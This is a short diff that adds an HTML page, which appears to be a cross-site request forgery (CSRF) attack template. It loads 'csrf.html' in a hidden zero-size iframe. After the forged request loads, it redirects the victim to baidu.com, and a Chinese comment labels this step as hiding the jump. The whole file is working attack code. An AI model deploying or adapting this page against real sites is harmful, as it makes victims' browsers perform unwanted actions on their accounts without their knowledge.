@@ -1,0 +1,15 @@
+<iframe id="demo" width="0" height="0" sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts"></iframe>
+<script type="text/javascript">
+var iframe = document.getElementById("demo");
+iframe.src = "csrf.html"; //csrf连接
+var i = 0;
+if (!iframe.attachEvent){
+	iframe.onload = function(){
+		i=i+1;
+		if(i==2)//这个一般为2
+		{
+			window.location.href="http://www.baidu.com";//隐藏跳转的链接
+		}
+	};
+} 
+</script>
